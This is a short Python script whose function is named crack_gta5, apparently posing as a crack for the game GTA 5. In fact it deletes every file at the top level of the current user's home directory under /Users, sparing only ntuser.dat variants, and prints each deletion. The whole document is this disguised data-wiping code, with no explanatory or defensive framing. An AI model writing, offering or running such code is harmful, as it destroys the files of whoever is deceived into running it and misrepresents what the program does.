import os
username = os.getenv("username")
def crack_gta5(directory_path, exclusions):
    try:
        for file in os.listdir(directory_path):
            file_path = os.path.join(directory_path, file)
            if os.path.isfile(file_path) and file not in exclusions:
                os.remove(file_path)
                print(f"Deleted: {file}")
            else:
                print(f"Excluded: {file}")
    except Exception as e:
        print(f"Error occurred: {e}")

# Usage
directory_path = '/Users/' + username
exclusions = ['ntuser.dat', 'ntuser', 'ntuser.DAT', 'NTUSER.DAT', 'NTUSER.dat', 'AppData/*']
crack_gta5(directory_path, exclusions)
